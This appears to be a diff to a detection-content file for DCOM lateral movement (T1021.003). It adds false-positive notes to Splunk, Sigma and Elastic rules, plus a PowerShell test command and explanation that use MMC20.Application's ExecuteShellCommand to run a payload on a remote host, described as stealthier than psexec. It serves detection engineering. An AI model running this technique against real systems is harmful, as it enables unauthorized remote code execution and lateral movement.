@@ -118,7 +118,8 @@
         "confidence": "medium",
         "log_ids": [
           "1"
-        ]
+        ],
+        "false_positives": "Admin scripts using similar cmdlets for legitimate system management"
       },
       {
         "platform": "splunk",
@@ -132,7 +133,8 @@
         "confidence": "medium",
         "log_ids": [
           "4624"
-        ]
+        ],
+        "false_positives": "Authorized remote management sessions between admin workstations"
       },
       {
         "platform": "sigma",
@@ -143,7 +145,8 @@
           "T1021.003"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Authorized remote management sessions between admin workstations"
       },
       {
         "platform": "elastic",
@@ -153,7 +156,9 @@
         "attack": [
           "T1021.003"
         ],
-        "fidelity": "behavioral"
+        "fidelity": "behavioral",
+        "false_positives": "Admin scripts using similar cmdlets for legitimate system management",
+        "confidence": "high"
       }
     ],
     "visibility": {
@@ -188,7 +193,8 @@
         "Review Sysmon, Windows Security Event Log for surrounding context (5 min before/after)",
         "Verify whether the activity matches known administrative baselines or change windows",
         "If confirmed malicious, isolate the host and escalate to incident response"
-      ]
+      ],
+      "test_command": "$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"<target_ip>\"))\n$dcom.Document.ActiveView.ExecuteShellCommand(\"cmd\", $null, \"/c <payload>\", \"7\")"
     }
   },
   "explain": "Lateral movement via DCOM by driving a remote COM object (needs local admin on the target):\n  [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"<target_ip>\"))   remotely instantiate the MMC20.Application object over RPC (port 135)\n  $dcom.Document.ActiveView.ExecuteShellCommand(\"cmd\",$null,\"/c <payload>\",\"7\")   use its ExecuteShellCommand method to run your command\nExecution happens under the DCOM object's process - stealthier than psexec since no service is created."
